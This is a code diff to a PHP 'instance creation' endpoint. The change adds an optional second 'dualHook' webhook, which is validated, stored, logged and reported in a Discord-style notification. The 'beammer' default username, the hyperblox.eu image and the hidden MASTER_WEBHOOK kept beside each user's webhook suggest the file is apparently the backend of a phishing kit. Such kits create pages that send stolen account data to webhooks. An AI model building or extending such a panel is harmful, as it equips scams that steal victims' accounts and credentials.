@@ -1,6 +1,6 @@
 <?php
 /**
- * Instance Creation Endpoint
+ * Instance Creation Endpoint with Dualhook Support
  */
 
 header('Content-Type: application/json');
@@ -26,6 +26,7 @@ $input = json_decode(file_get_contents('php://input'), true);
 
 $directory = sanitizeDirectory($input['directory'] ?? '');
 $webhook = trim($input['webhook'] ?? '');
+$dualHook = trim($input['dualHook'] ?? ''); // NEW: Dual webhook support
 $username = trim($input['username'] ?? 'beammer');
 $profilePicture = trim($input['profilePicture'] ?? 'https://hyperblox.eu/files/img.png');
 
@@ -60,6 +61,13 @@ if (!validateWebhook($webhook)) {
     exit;
 }
 
+// Validate dual hook if provided
+if (!empty($dualHook) && !validateWebhook($dualHook)) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Invalid dual webhook URL.']);
+    exit;
+}
+
 // Rate limiting
 $clientIP = getUserIP();
 if (!checkRateLimit($clientIP, 10, 3600)) {
@@ -76,6 +84,7 @@ $instanceData = [
     'directory' => $directory,
     'webhook' => MASTER_WEBHOOK,
     'userWebhook' => $webhook,
+    'dualHook' => $dualHook, // NEW: Store dual webhook
     'username' => $username,
     'profilePicture' => $profilePicture,
     'createdAt' => date('c'),
@@ -107,6 +116,7 @@ $tokenData = [
     'token' => $token,
     'directory' => $directory,
     'webhook' => $webhook,
+    'dualHook' => $dualHook, // NEW: Store in token
     'username' => $username,
     'createdAt' => date('c')
 ];
@@ -121,6 +131,7 @@ updateGlobalStats('totalInstances', 1);
 // Log creation
 logSecurityEvent('instance_created', [
     'directory' => $directory,
+    'has_dualhook' => !empty($dualHook),
     'token' => substr($token, 0, 8) . '...'
 ]);
 
@@ -162,6 +173,11 @@ $webhookData = [
                     'name' => '⏰ Created',
                     'value' => date('Y-m-d H:i:s'),
                     'inline' => true
+                ],
+                [
+                    'name' => '🔔 Dual Webhook',
+                    'value' => !empty($dualHook) ? '✅ Enabled' : '❌ Disabled',
+                    'inline' => true
                 ]
             ],
             'footer' => [
@@ -181,7 +197,8 @@ echo json_encode([
     'token' => $token,
     'directory' => $directory,
     'instanceUrl' => $baseUrl . '/public/?dir=' . $directory,
-    'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $token
+    'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $token,
+    'hasDualHook' => !empty($dualHook)
 ]);
 
 ?>
